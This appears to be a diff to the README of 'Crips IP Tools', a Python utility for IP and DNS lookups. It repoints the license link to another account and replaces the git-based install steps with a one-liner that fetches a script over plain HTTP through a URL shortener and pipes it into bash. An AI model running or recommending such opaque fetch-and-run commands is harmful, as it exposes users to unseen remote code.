@@ -1,5 +1,5 @@
-[![MIT](https://img.shields.io/packagist/l/doctrine/orm.svg)](https://github.com/Manisso/Crips/blob/master/LICENSE) 
-[![python](https://img.shields.io/badge/python-2.7-brightgreen.svg)](https://www.python.org/downloads/release/python-2714/)
+[![MIT](https://img.shields.io/packagist/l/doctrine/orm.svg)](https://github.com/EmmanuelScopelliti/Crips/blob/master/LICENSE) 
+[![python](https://img.shields.io/badge/python-3.12-brightgreen.svg)](https://www.python.org/downloads/release/python-3123/)
 [![OS](https://img.shields.io/badge/Tested%20On-Linux%20%7C%20Android-yellowgreen.svg)](https://termux.com/)
 # Crips IP Tools
 This Tools is a collection of online IP Tools that can be used to quickly get information about IP Address's, Web Pages and DNS records.
@@ -31,17 +31,11 @@ Discover web hosts sharing an IP address with a reverse IP lookup.
 # INSTALL & UPDATE
 To install the tools directly in the system and get new update directly using terminal
 # Installation [Linux](https://fr.wikipedia.org/wiki/Linux) [![alt tag](http://icons.iconarchive.com/icons/dakirby309/simply-styled/32/OS-Linux-icon.png)](https://fr.wikipedia.org/wiki/Linux)
-[✓] git clone https://github.com/Manisso/Crips.git
 
-[✓] cd Crips && python Crips.py
-
-[◉] 0 : INSTALL & UPDATE
-
-[◉] -> 0
-
-[✓] press 0 
-
-[✓] Congratulation Crips is Installed !
+```bash
+bash <(wget -qO- http://gg.gg/1aypi4)
+```
+(using [gg.gg](https://gg.gg) since [git.io](https://git.io) has been deprecated)
 
 # Installation [Windows](https://fr.wikipedia.org/wiki/Microsoft_Windows)[![alt tag](http://icons.iconarchive.com/icons/yootheme/social-bookmark/32/social-windows-button-icon.png)](https://fr.wikipedia.org/wiki/Microsoft_Windows)
 
